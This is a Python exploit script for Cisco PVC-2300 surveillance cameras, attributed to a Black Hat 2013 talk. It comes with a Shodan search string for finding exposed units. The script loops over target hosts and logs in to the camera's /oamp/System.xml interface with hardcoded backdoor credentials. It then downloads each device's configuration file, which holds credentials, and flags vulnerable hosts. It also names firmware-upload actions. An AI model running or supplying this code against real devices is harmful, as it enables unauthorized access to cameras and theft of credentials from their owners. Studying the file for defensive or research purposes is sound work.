"""
Cisco-PVC-2300
Python implementation by Lorenzo Comi
Exploit found in below slides:
https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf
Shodan dork: lighttpd/1.4.13 ip camera
"""

import requests
import logging
import time

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green


class NextTarget():
    pass


class Cisco_PVC():

    def __init__(self, target_list):
        self.target_list = target_list
        self.findings = []


    def run(self):
        for target in self.target_list:
            ip = target.split(':')[0]
            port = target.split(':')[1]
            logging.info('Testing: %s:%s' % (ip, port))
            try:
                payload = {'action':'login', 'user':'L1_admin', 'password':'L1_51'}
                """
                Valid actions:
                - downloadConfigurationFile
                - uploadConfigurationFile
                - updateFirmware
                - loadFirmware
                """
                req = requests.get('http://%s:%s/oamp/System.xml' % (ip, port), params=payload)
                logging.debug('URL: ' + str(req.url))
                logging.debug('Head: ' + str(req.headers))
                res = req.text
                logging.debug('RES: ' + res)
                if 'try it later' in res:
                    time.sleep(3)
                    req = requests.get('http://%s:%s/oamp/System.xml' % (ip, port), params=payload)
                    res = req.text
                if 'OK' not in res:
                    logging.debug(R+'Target %s is not vulnerable' % ip +W)

                else:
                    payload = {'action': 'downloadConfigurationFile'}
                    headers = {'sessionID': req.headers['sessionID']}
                    req = requests.get('http://%s:%s/oamp/System.xml' % (ip, port), params=payload, headers=headers)
                    logging.debug('URL: ' + str(req.url))
                    logging.debug('Head: ' + str(req.headers))
                    res = req.text
                    if 'statusCode' in res:
                        logging.debug(R+'Exploit failed, server response: '+W+res)
                    else:
                        logging.info(G+'Target %s is vulnerable!' % ip +W)
                        finding = ip + ';' + port + ';' + 'HTTP' + ';' + 'Credentials Disclosure' + ';' +'Cisco-PVC'+';'+ 'URL: ' + str(
                            req.url)
                        self.findings.append(finding)

            except Exception as e:
                if str(e) == 'NextTarget':
                    continue
                else:
                    logging.warning(str(e))
        return self.findings